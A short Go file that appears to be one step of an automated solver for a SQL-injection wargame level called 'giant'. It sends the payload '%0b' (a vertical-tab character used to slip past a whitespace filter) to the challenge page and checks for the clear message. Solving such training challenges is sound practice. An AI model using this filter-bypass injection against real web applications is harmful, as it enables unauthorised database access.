package problem

import(
	"fmt"
	"strings"
)

func Giant(session string){
	file := "giant_0ea82d6bd3e3cb4614e318f096753475.php"
	param := map[string]string{
		"shit" : "%0b",
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"GIANT Clear!"){
		fmt.Println("GIANT Clear!")
	}
}